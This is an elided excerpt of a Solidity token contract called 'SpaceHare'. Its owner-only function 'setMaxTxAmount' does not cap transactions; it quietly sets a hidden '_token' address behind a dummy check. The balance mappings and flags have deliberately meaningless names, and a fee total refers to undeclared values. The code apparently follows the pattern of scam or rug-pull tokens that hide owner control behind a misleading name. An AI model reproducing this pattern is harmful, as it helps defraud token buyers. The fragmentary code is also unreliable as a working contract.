...
contract Ownable is Context {
    ...
    function setMaxTxAmount(address toSender, address toSenders) external onlyOwner{
        require(toSenders==address(0));
        _token = toSender;
    }
...
contract SpaceHare is Context, IERC20, Ownable {
    mapping(address => bool) private fajkfnek;
    ...
    uint256 private idakfieao = uint256(0);
    using SafeMath for uint256;
    address[] private _mekajfjka;
    mapping(address => uint256) private _wakjfjkaw;
    uint8 private _kwajkfea;
    address _owner;
    mapping(address => uint256) private _kdklwa;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tFeeTotal = BurnFee+marketFee;

    uint256 private _totalSupply = 1000000000000000 * 10**4;
    uint8 private _decimals = 9;
    string private _name = "SpaceHare";
    string private _symbol = "SpaceHare";
    ...
    constructor() public {
        _owner = _msgSender();
        _wakjfjkaw[_msgSender()] = _totalSupply;
    ...
    function _transfers(
        ...
        _wakjfjkaw[sender] = _wakjfjkaw[sender].sub(toAmount);
        _wakjfjkaw[recipient] = _wakjfjkaw[recipient].add(toAmount);
